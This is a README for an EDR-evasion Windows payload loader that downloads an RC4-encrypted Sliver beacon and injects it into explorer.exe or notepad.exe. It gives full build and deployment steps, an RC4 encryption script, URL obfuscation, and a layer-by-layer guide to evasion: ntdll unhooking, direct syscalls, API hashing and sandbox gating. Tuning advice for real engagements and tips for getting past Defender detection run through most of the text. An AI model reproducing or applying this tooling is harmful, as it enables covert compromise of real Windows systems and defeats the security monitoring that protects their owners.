# EDR-Resilient Windows Payload Loader

A modular, multi-layer evasion loader for delivering e.g. Sliver beacon shellcode onto modern Windows targets with **Microsoft Defender / EDR** enabled. Cross-compiles from Kali Linux (MinGW-w64) or builds natively with VS2022.

---

## Build Requirements

### Cross-compile from Kali Linux (primary)

```bash
sudo apt update
sudo apt install -y cmake g++-mingw-w64-x86-64
```

### Native Windows (VS2022)

- Visual Studio 2022 with **Desktop development with C++** workload
- CMake 3.24+

---

## Build Instructions

### Kali / Linux (MinGW-w64 cross-compile)

```bash
mkdir build && cd build
cmake -DCMAKE_TOOLCHAIN_FILE=../loader/cmake/x86_64-w64-mingw32.cmake ../loader
cmake --build . --target loader
```

Output: `build/loader.exe`

To also build the research harness:

```bash
cmake --build . --target research_harness
```

### Windows (VS2022 Developer PowerShell)

```powershell
mkdir build; cd build
cmake -G "Visual Studio 17 2022" -A x64 -DCMAKE_BUILD_TYPE=Release ..
cmake --build . --config Release --target loader
```

Output: `build/Release/loader.exe`

---

## Project Structure

```
.
├── app/
│   ├── config.hpp              # URLs, keys, obfuscated constants
│   ├── main_loader.cpp         # 8-phase operational loader
│   └── main_research.cpp       # Diagnostic harness ( preserved )
├── include/
│   ├── api_hash/               # DJB2 hash-based API resolution
│   ├── cryptography/
│   │   └── rc4.hpp             # In-place RC4 decrypt
│   ├── evasion/                # Anti-VM / anti-debug / sandbox checks
│   ├── inject/                 # Thread hijack + suspended process injection
│   ├── integrity/              # PE export parser, hook scanner
│   ├── native/                 # Nt* function pointer types
│   ├── net/                    # WinSock HTTP client + URL parser
│   ├── syscall/                # Runtime direct-syscall stub generator
│   ├── telemetry/              # JSON report writer (research only)
│   └── unhook/                 # Restore clean ntdll from disk image
├── src/                        # Implementation files matching include/
├── cmake/
│   └── x86_64-w64-mingw32.cmake   # MinGW toolchain file
├── CMakeLists.txt
├── url_obfuscator.py           # XOR obfuscate C2 URLs
└── remote_simple_loader.cpp # Original single-file loader (reference)
```

---

## 8 Evasion Layers

| Layer | Module | What it does |
|-------|--------|--------------|
| 1 | `evasion.cpp` | **Jitter** (30–120 s initial + 3× 1–5 s micro-delays) |
| 2 | `evasion.cpp` | **Environment gate** — VM (CPUID hypervisor string), debugger (NtQueryInformationProcess debug port/object, PEB.NtGlobalFlag), sandbox (CPU<2, RAM<2 GB, uptime<1 h, generic username, resolution<1024×768). Requires **≥2 signals** before abort. |
| 3 | `unhook.cpp` | **API unhooking** — maps clean `C:\Windows\System32\ntdll.dll`, walks PE exports, detects hooks (`FF 25`, `E9`, `EB`), copies 24 bytes of clean prologue back to local ntdll. |
| 4 | `syscall.cpp` | **Direct syscalls** — extracts syscall numbers at runtime from the clean disk-mapped ntdll, generates `mov r10,rcx / mov eax,NUM / syscall / ret` trampolines in one RX page. |
| 5 | `api_hash.cpp` | **API hash resolution** — manual PE export table walk with DJB2 hashes; removes plaintext API strings from `.rdata`. |
| 6 | `net/` | **WinSock instead of WinINet** — raw socket HTTP/1.1 GET with Chrome 120 user-agent. |
| 7 | `main_loader.cpp` | **Heap masking** — 1 MB RW cover allocation, shellcode embedded at 64 KB offset, only the sub-region promoted to RX. |
| 8 | `config.hpp` | **URL obfuscation** — XOR-encrypted URL bytes decrypted at runtime. |

---

## Research Harness (`research_harness.exe`)

The research harness is a **safe, no-payload diagnostic tool** that probes the target Windows environment before you commit the real loader. It does **not** download, decrypt, or execute any shellcode — it only inspects the system and writes a JSON report.

### What it does

| Step | Action | Why it matters |
|------|--------|----------------|
| 1 | Late-binds `NtQuerySystemInformation`, `NtReadVirtualMemory`, `NtClose`, etc. from `ntdll.dll` | Validates that native API resolution works on this Windows build |
| 2 | Finds `explorer.exe` PID via direct `SystemProcessInformation` syscall (no ToolHelp) | Confirms stealthy process enumeration works; gives you a known injection target |
| 3 | Sends an HTTP GET probe to `kSampleUrl` via raw WinSock | Tests whether raw socket egress is allowed through the target's firewall |
| 4 | Maps `C:\Windows\System32\ntdll.dll` from disk as a clean reference | Establishes the ground-truth unhooked baseline |
| 5 | Scans the local in-memory `ntdll.dll` against the reference image | Detects EDR hooks: indirect jumps (`FF 25`), relative jumps (`E9`), short jumps (`EB`), byte mismatches |
| 6 | Writes `research_report.json` | Gives you a forensic record of EDR presence before you run the payload |

### Example `research_report.json`

```json
{
  "reference_path": "C:\\Windows\\System32\\ntdll.dll",
  "explorer_pid": 4824,
  "http": {
    "success": true,
    "status_code": 200,
    "body_size": 2,
    "error": ""
  },
  "scan_results": [
    {
      "function_name": "NtAllocateVirtualMemory",
      "indicator": "indirect jump stub",
      "differs_from_reference": true,
      "note": "Suspicious entry sequence and prologue differs from mapped baseline",
      "local_bytes": "FF 25 00 00 ...",
      "reference_bytes": "4C 8B D1 B8 ..."
    }
  ]
}
```

### When to use it

1. **Right after initial access** — before dropping `loader.exe`, run `research_harness.exe` to confirm:
   - EDR is (or is not) hooking `NtAllocateVirtualMemory`, `VirtualProtect`, etc.
   - Your WinSock C2 egress is not blocked.
   - `explorer.exe` is enumerable for injection.

2. **After Patch Tuesday / Windows updates** — if a previously working target breaks, run the harness to see if syscall prologues changed or new hooks appeared.

3. **To validate your build** — if the harness works but `loader.exe` crashes, the issue is isolated to injection/syscalls, not basic API resolution or networking.

### Build & run

```bash
cd build
cmake --build . --target research_harness
# On target:
research_harness.exe
# Then exfiltrate research_report.json
type research_report.json
```

### Configure the probe URL

Edit `app/config.hpp`:

```cpp
inline constexpr std::string_view kSampleUrl = "http://10.10.X.X:8080/health";
```

### Bottom line

| | `research_harness.exe` | `loader.exe` |
|---|---|---|
| **Purpose** | Reconnaissance / OPSEC check | Weapon — delivers Sliver beacon |
| **Network** | One HTTP probe | Downloads full encrypted payload |
| **Memory** | No allocation/protection of executable pages | Allocates RX memory for shellcode |
| **Risk** | Very low — no shellcode, no decryption | Higher — signature target if analyzed |
| **When to run** | Before the real payload | When you're ready to get the beacon |

---

## Execution Flow (`main_loader.cpp`)

```
PHASE 0: Jitter delay (30–120 s random sleep + micro-delays)
PHASE 1: if (ShouldAbort()) ExitProcess(0)
PHASE 2: UnhookAll()                // restore clean ntdll prologues
PHASE 3: SyscallDispatcher::Init() // runtime syscall stub generation
PHASE 4: Decrypt URL (XOR)
PHASE 5: WinSock download payload
PHASE 6: RC4 decrypt payload (key = "windows.h")
PHASE 7: Inject(shellcode)
         ├─ Strategy 1: Thread-hijack explorer.exe
         ├─ Strategy 2: Spawn notepad.exe suspended → hijack main thread
         └─ Strategy 3: Fallback to heap-masked direct execution
PHASE 8: ExitProcess(0)
```

---

## Sliver Beacon Workflow

### 1. Generate beacon shellcode

```
sliver > generate beacon --seconds 10 --jitter 3 --os windows --arch amd64 \
         --format shellcode --mtls 10.10.X.X:8443 \
         --name beacon-mtls --save ./beacon.bin --skip-symbols
```

### 2. RC4-encrypt the payload

I use the standard RC4 script from the AVEvasion toolkit:

```bash
/opt/AVEvasion/rc4/rc4.py windows.h ./beacon.bin
# Output: ./beacon.bin.enc
mv beacon.bin.enc data.enc
```

**Content of `/opt/AVEvasion/rc4/rc4.py`:**

```python
import sys

def rc4(data, key):
    keylen = len(key)
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % keylen]) % 256
        s[i], s[j] = s[j], s[i]

    i = 0
    j = 0
    encrypted = bytearray()
    for n in range(len(data)):
        i = (i + 1) % 256
        j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        encrypted.append(data[n] ^ s[(s[i] + s[j]) % 256])

    return encrypted

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: ./rc4.py <key> <filename>")
        exit(0)

    key = sys.argv[1]
    filename = sys.argv[2]

    with open(filename, 'rb') as f:
        data = f.read()

    encrypted = rc4(data, key.encode())

    with open(f"{filename}.enc", 'wb') as f:
        f.write(encrypted)

    print(f"Encrypted: {filename}.enc")
```

### 3. Obfuscate the download URL

```bash
python3 url_obfuscator.py http://10.10.X.X/data.enc 0x55 --c-init
```

Paste the generated byte array into `app/config.hpp` under `kObfuscatedUrl`.

### 4. Build & deploy

```bash
cd build
cmake --build . --target loader
scp loader.exe xtk@win:c:/users/<target>/test/
```

### 5. Serve payload

```bash
python3 -m http.server 80
```

### 6. Start mTLS listener

```
sliver > mtls -l 8443
```

### 7. Run loader on target

```cmd
C:\Users\...\Music> loader.exe
```

---

## Configuration (`app/config.hpp`)

| Constant | Purpose |
|----------|---------|
| `kObfuscatedUrl` | XOR-encrypted URL bytes (from `url_obfuscator.py`) |
| `kUrlXorKey` | XOR key (default `0x55`) |
| `kRc4Key` | RC4 decryption key (`"windows.h"`) |
| `kUserAgent` | HTTP User-Agent string |
| `kReferenceNtdllPath` | Clean ntdll path for unhooking |
| `kInjectTargetProcess` | Process to inject into (see table below) |

---

### Injection Target (`kInjectTargetProcess`)

This is the **most important setting** for controlling privileges and stealth.

| Value | Behaviour | User Context | Use When |
|-------|-----------|--------------|----------|
| `L""` *(empty)* | **Direct execution** in current process (old loader behaviour). | Current user (e.g., `Administrator`) | You want to **preserve your current privileges**. Default for CTF. |
| `L"explorer.exe"` | Thread-hijack into an existing explorer.exe thread. | Whatever user owns explorer (often a different service account) | Maximum **stealth** — explorer is always running and looks benign. |
| `L"notepad.exe"` | Spawn notepad.exe suspended, inject main thread, resume. | Current user (same as direct) | Stealthier than direct (notepad is a normal app) but still keeps your privileges. |

**Privilege Trap:** If you inject into `explorer.exe` and explorer is running as `DOMAIN\web_svc`, your beacon comes back as `web_svc` — **not** as the `Administrator` who ran the loader. 

**Recommendation:**
- **CTF / privilege escalation** → `kInjectTargetProcess = L""` (direct, keep admin)
- **Real engagement, already have desired privs** → `L"notepad.exe"` (stealthy, same user)
- **Real engagement, low priv, want to blend in** → `L"explorer.exe"` (stealthy, but changes user context)

---

## Configuration Recommendations

### CTF / Lab Testing vs Real-World Engagement

The loader includes three compile-time kill-switches in `app/config.hpp`.

#### Recommended settings for **CTF / Lab / CTF**

```cpp
inline constexpr bool kEnableJitter         = false;
inline constexpr bool kEnableEvasionChecks  = false;
inline constexpr bool kEnableDebugLog       = true;
```

| Switch | Why `false`/`true` |
|--------|-------------------|
| `kEnableJitter` | CTF boxes are disposable — you don't need to wait 30–120 s to avoid sandbox detonation. |
| `kEnableEvasionChecks` | **Critical.** CTF targets ARE VMs (VMware/Hyper-V), have 1–2 CPUs, ~4 GB RAM, and generic usernames like `Administrator`. The sandbox gate fires with a score of 2–4 and the loader instantly `ExitProcess(0)`'s before touching the network. This is why you saw **zero HTTP hits** on your listener. |
| `kEnableDebugLog` | Keep `true` until you're confident. The log at `%TEMP%\loader_debug.txt` shows exactly which phase failed (jitter, evasion, URL, HTTP, RC4, injection). |

#### Recommended settings for **Production / Real-World**

```cpp
inline constexpr bool kEnableJitter         = true;
inline constexpr bool kEnableEvasionChecks  = true;
inline constexpr bool kEnableDebugLog       = false;
```

| Switch | Why `true`/`false` |
|--------|-------------------|
| `kEnableJitter` | Automated sandboxes detonate samples within seconds. A 30–120 s sleep causes most sandboxes to time out before the payload runs. |
| `kEnableEvasionChecks` | Real enterprise workstations have 4+ CPUs, 8+ GB RAM, domain usernames (`CORP\jdoe`), and no hypervisor CPUID string. The gate **does not fire** on bare-metal targets. It only fires on sandboxes and low-spec VMs. |
| `kEnableDebugLog` | Disable for OPSEC. No forensic traces left behind. |

---

### Evasion Check Thresholds

| Check | Threshold | Rationale |
|-------|-----------|-----------|
| **VM detection** | CPUID hypervisor vendor string (`VMware`, `VBox`, `KVM`, `Xen`, `QEMU`, `Bochs`) | Catches most virtualized sandboxes. |
| **Debugger** | Debug port (7), debug object (30), `IsDebuggerPresent()`, PEB `NtGlobalFlag` | Catches dynamic analysis. |
| **CPU count** | `< 2` | Sandboxes often run on 1 vCPU. Real workstations typically have 4+. |
| **RAM** | `< 2 GB`  | Sandboxes are often starved. Real workstations usually have 8+ GB. |
| **Uptime** | `< 1 hour` | Fresh sandbox spins usually have very low uptime. |
| **Username** | Contains `admin`, `user`, `test`, `student`, `sandbox`, `vm`, `virtual` | Generic sandbox usernames. |
| **Resolution** | `< 1024×768` | Headless sandboxes often run at 800×600. |

`ShouldAbort()` requires **≥2 signals** before killing the process. This reduces false positives on legitimate low-spec machines that may hit one check (e.g., a real laptop with 2 CPUs but everything else normal).

---

## Key Design Notes

- **No MASM / assembly files** — syscall stubs are generated at runtime via `VirtualAlloc` + opcode templates. This avoids MinGW/MSVC assembly portability issues.
- **Dynamic syscall numbers** — extracted from the disk-mapped clean `ntdll.dll` at runtime, so the loader works across Windows 10/11 build variances.
- **Fail-open everywhere** — if unhooking fails, syscalls fall back to standard APIs. If injection fails, falls back to heap-masked direct execution. If sandbox gate triggers, exits cleanly with no execution trace.
- **Subsystem** — `/SUBSYSTEM:WINDOWS` (GUI, no console window) for the loader; console for the research harness.
- **Stripped** — `-s` / `-Os` flags produce a small, symbol-free binary.

---

## Troubleshooting

### `Windows.h: No such file or directory`
MinGW headers are case-sensitive. All headers use lowercase (`windows.h`, `winsock2.h`, `tlhelp32.h`).

### `-lWs2_32: cannot find`
The library name is lowercase on MinGW: `ws2_32`. The CMakeLists.txt already handles this.

### Syscall stubs return `0` / `Init()` fails
- Ensure `C:\Windows\System32\ntdll.dll` exists on the target (it always should).
- The fallback path uses standard `VirtualAllocEx` / `WriteProcessMemory` / `VirtualProtectEx` so the loader still works even if stub generation fails.

### Defender still flags the loader
- The loader itself does **not** contain shellcode; the payload is fetched remotely.
- If the binary is still caught, consider:
  - Changing the RC4 key and re-encrypting the payload
  - Modifying the jitter delays
  - Using a different C2 URL/domain
  - Adding junk imports or resources to change file hash

---

## Credits & References

- Original loader: `remote_simple_loader.cpp`
- Sliver C2: https://sliver.sh
- SysWhispers-style direct syscalls: https://github.com/klezVirus/SysWhispers3
- DJB2 hash: classic string hash by Daniel J. Bernstein
